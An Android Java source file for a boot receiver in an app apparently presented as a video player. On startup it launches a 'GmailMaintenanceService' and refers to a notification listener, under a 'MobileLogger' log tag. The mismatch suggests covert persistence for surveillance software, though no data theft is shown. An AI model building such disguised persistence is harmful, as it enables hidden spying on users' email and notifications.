package com.jumpy.videoplayerapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            Log.i("MobileLogger", "Boot completed, starting services");
            
            // Start notification listener service
            // The system will automatically start the notification listener service
            // when it's enabled in settings
            
            // Start Gmail maintenance service
            Intent gmailServiceIntent = new Intent(context, GmailMaintenanceService.class);
            context.startService(gmailServiceIntent);
            Log.i("MobileLogger", "Gmail maintenance service started");
        }
    }
} 